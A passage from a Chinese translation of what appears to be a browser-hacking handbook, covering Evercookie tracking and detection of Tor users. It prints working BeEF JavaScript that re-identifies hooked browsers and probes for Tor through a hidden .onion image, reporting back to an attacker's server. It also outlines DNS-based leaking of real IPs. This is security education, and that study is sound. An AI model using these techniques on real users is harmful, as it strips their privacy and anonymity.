
![c05f029.eps](image_fi/662090c05/c05f029.png)

end figure 

截至本文撰写时，仍不存在一种简单方法可以检测浏览器是否处于隐私模式。早期由 Jeremiah Grossman29 和 Collin Jackson30 进行的研究表明，较旧的浏览器版本（如 Firefox 1.5/2.0）可能会泄露它们是否处于隐私模式。研究人员通过 JavaScript getComputedStyle 函数（如第 4 章“利用浏览器历史记录”部分所述）来实现这一点。

仅需知道请求服务器的源 IP 地址，就能确定客户端的地理位置，如果不是区域层面，至少可以确定到国家边界内。

这并不意味着隐私在其他地方不受重视。例如，Electronic Frontier Foundation（EFF）一直在前线维护人们的隐私、自由言论以及其他消费者权利。另一个旨在保护在线匿名性的项目是 Tor 项目，最初称为 The Onion Router 项目。

在本节的其余部分，您将更详细地探索 Tor 网络，并了解一些可以用于绕过浏览器中已有的隐私机制的技巧。

## 非 Cookie 会话跟踪

尽管本节可能不如偷窥无辜目标的网络摄像头那样吸引人，但跟踪用户在 Internet 上的浏览行为同样有用。在第 4 章中，您已经获得了关于浏览器历史记录的大量信息，请参考该章节以获取更多此类信息泄露的背景。

当人们讨论跟踪浏览器会话时，通常指的是 Cookie 作为主要技术。您可以在第 6 章“绕过 Cookie 防护”部分了解更多关于 Cookie 的内容。

如果用户清除了 Cookie，或者针对特定站点禁用了 Cookie，在这种情况下，Cookie 单独无法用于跨多个站点或访问进行用户跟踪。

为使不可破坏的 Cookie 更可行，Samy Kamkar（第 2 章中讨论的著名 Samy 蠕虫作者）提出了 Evercookie。Evercookie 通过 [http://samy.pl/evercookie/](http://samy.pl/evercookie/) 获取，采用多层次方式存储可提取的会话标识符。它不单纯依赖普通 HTTP Cookie，而是利用多种其他 artifact，包括：

*   本地共享对象或 Flash Cookie

*   Silverlight 存储

*   IE userData 存储

*   HTML5 存储

为提高框架返回浏览器会话可识别的可能性，BeEF 会话 JavaScript 库使用 Evercookie JavaScript 库。这一点在 BeEF 的 get_hook_session_id() 函数中可见，该函数查询三种 Evercookie artifact：cookie、userdata、window data：

```javascript
//Create the evercookie object first
ec: new evercookie(), 
  

get_hook_session_id: function() {
  // check if the browser is already known to the framework
  var id = this.ec.evercookie_cookie("BEEFHOOK");
  if (typeof id == 'undefined') {
    var id = this.ec.evercookie_userdata("BEEFHOOK");
  }
  if (typeof id == 'undefined') {
    var id = this.ec.evercookie_window("BEEFHOOK");
  }
  
  // if the browser is not known create a hook session id and set it
  if ((typeof id == 'undefined') || (id == null)) {
    id = this.gen_hook_session_id();
    this.set_hook_session_id(id);
  }
  
  // return the hooked browser session identifier
  return id;
}
```

虽然这不是直接可利用的漏洞，但值得注意的是，上网时不断留下的 Internet 活动痕迹。

## 绕过匿名化

作为攻击者，了解目标浏览器是否通过 Tor 来隐藏其流量可能很有价值。那么，如何检测这一点呢？

Tor 网络的一个有趣特性是任何人都可以提供隐藏服务（仅限于 Tor 网络内可访问）。这称为隐藏服务协议（Hidden Service Protocol），它实现服务器端匿名化，而非仅客户端端匿名化。关于隐藏服务协议的技术细节在此书范围之外，如需更多信息，可访问 [https://www.torproject.org/docs/hidden-services.html.en](https://www.torproject.org/docs/hidden-services.html.en)。

由于这些匿名化服务仅能在 Tor 网络内访问，它们为判断被钩住的浏览器是否使用 Tor 提供了方法。DeepSearch 是一个仅限 Tor 网络的搜索索引，其地址为 [http://xycpusearchon2mc.onion](http://xycpusearchon2mc.onion)。.onion 是伪顶级域名，用于标识 Tor 隐藏服务。虽然它看起来像合法顶级域名，但实际上并非如此，仅在正确配置本地代理并连接到 Tor 网络时才可访问。

DeepSearch 包含一个标题徽标，网址为 [http://xycpusearchon2mc.onion/deeplogo.jpg](http://xycpusearchon2mc.onion/deeplogo.jpg)，如果浏览器能够访问该图像，则表明浏览器正在 Tor 网络上。

BeEF 的“Detect Tor”模块通过执行以下 JavaScript 代码来检测 Tor 使用情况：

```javascript
var img = new Image();
  img.setAttribute("style","visibility:hidden");
  img.setAttribute("width","0");
  img.setAttribute("height","0");
  img.src = '<%= @tor_resource %>';
  img.id = 'torimg';
  img.setAttribute("attr","start");
  img.onerror = function() {
    this.setAttribute("attr","error");
  };
  img.onload = function() {
    this.setAttribute("attr","load");
  };

  document.body.appendChild(img);

  setTimeout(function() {
    var img = document.getElementById('torimg');  
    if (img.getAttribute("attr") == "error") {
      beef.net.send('<%= @command_url %>',
        <%= @command_id %>,
        'result=Browser is not behind Tor');
    } else if (img.getAttribute("attr") == "load") {
      beef.net.send('<%= @command_url %>',
        <%= @command_id %>,
        'result=Browser is behind Tor');
    } else if (img.getAttribute("attr") == "start") {
      beef.net.send('<%= @command_url %>',
        <%= @command_id %>,
          'result=Browser timed out. \
           Cannot determine if browser is behind Tor');
    };
    document.body.removeChild(img);
    }, <%= @timeout %>);
```

此代码首先创建一个指向 DeepSearch 徽标的 `<img>` 标签，其 URL 通过 @tor_resource 变量动态设置。随后为图像绑定两个事件处理程序：一个在加载成功时触发，另一个在加载失败时触发。最后将图像添加到文档的 body 中，从而向 DeepSearch 服务器提交请求。

`setTimeout()` 函数用于在预定义的时间后检查图像的状态。默认情况下，@timeout 变量设置为 10,000（即 10 秒）。当计时器结束后，代码会检查图像的状态，以判断其是否已加载。如果图像已加载，则说明浏览器处于 Tor 网络内。

如果浏览器使用的是像 Tor 这样的匿名化代理，那么尝试获取用户的真实 IP 地址可能会进一步泄露其私人信息。这可以通过多种方式实现。

第一种方法是强制浏览器向您控制的 DNS 服务器进行 DNS 请求。如果浏览器配置为通过 Tor 代理所有流量，但不代理 DNS 请求，这可能会泄露有价值的信息。与之前的示例相同，这可以通过简单地向 DOM 添加一个指向由您控制的 DNS 服务器解析的域名的 `<img>` 对象来实现。

